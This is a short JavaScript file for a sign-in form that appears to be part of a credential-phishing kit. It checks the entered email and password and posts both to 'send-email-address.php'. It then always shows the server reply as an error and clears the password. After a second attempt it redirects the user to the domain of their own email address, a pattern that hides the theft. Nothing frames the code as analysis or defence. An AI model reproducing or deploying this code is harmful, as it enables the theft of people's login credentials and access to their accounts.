var email = document.getElementById('email');
var password = document.getElementById('password');

$('#signin').click(function(e){
	e.preventDefault();
	var checkmail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/g;
	var alert2 = document.querySelector('.alert2');
	if($('#email').val() == ""){
		$('#email').focus();
		$('.alert2').show();
		alert2.textContent = "Email Required.";
		return false;
	}else if(!($('#email').val().match(checkmail))){
		$('#email').focus();
		$('.alert2').show();
		alert2.textContent = "Incorrect email format.";
		return false;
	}else if($('#password').val() == ""){
		$('#name').focus();
		$('.alert2').show();
		alert2.textContent = "Password Required";
		return false;
	}else{
		alert2.className = alert2.className.replace(/\balert-danger\b/g, "alert-info");
		alert2.textContent = "Loggin in...";
		$('.alert2').show();

		var xmlhttp;
	    if(window.XMLHttpRequest){
	      xmlhttp = new XMLHttpRequest();
	    }else{
	      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	    }

	    xmlhttp.onreadystatechange=function(){
	      if(xmlhttp.readyState==4 && xmlhttp.status==200){
				alert2.className = alert2.className.replace(/\balert-info\b/g, "alert-danger");
				alert2.textContent = xmlhttp.responseText;
				document.getElementById('password').value = "";
				document.getElementById('password').focus();
	      } else {
	      	console.log(xmlhttp.responseText);
	      }
	    }

	    var email = document.getElementById('email').value;
	    var password = document.getElementById('password').value;
	    var formdata = new FormData();

    	formdata.append("email", email);
    	formdata.append("password", password);

	    var url = 'send-email-address.php?others';

		var redirectUrl = email.split("@")[1];
		var counter = sessionStorage.getItem('counter');

		if(counter >= 1){
			window.location.href = 'https://'+redirectUrl;
		}else{
			sessionStorage.setItem('counter', counter+1);
		}
	    
	    xmlhttp.open("POST", url);
	    xmlhttp.send(formdata);

	    return false;

	}
})